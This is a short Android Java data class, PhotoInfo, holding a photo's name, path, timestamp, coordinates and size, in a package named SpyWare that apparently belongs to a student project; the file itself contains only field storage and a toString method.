package com.BUET_Arbirary.SpyWare;

import android.graphics.drawable.Drawable;
import android.util.Log;


public class PhotoInfo {
	String photoName;
	String photoUrl;
	String Time;
	String lon,lat;
	long size;
	Drawable drawable;
	
	public PhotoInfo(String photoName, String photoUrl, String time,
			String lon, String lat, long size) {
		super();
		this.photoName = photoName;
		this.photoUrl = photoUrl;
		Time = time;
		this.lon = lon;
		this.lat = lat;
		this.size = size;
		
		drawable=Drawable.createFromPath(photoUrl);
	}
	@Override
	public String toString() {

		return "PhotoInfo [photoName=" + photoName + ", photoUrl=" + photoUrl
				+ ", Time=" + Time + ", lon=" + lon + ", lat=" + lat
				+ ", size=" + size/1000+"."+size%1000 +"mb"+ "]";
	}
	
	
}
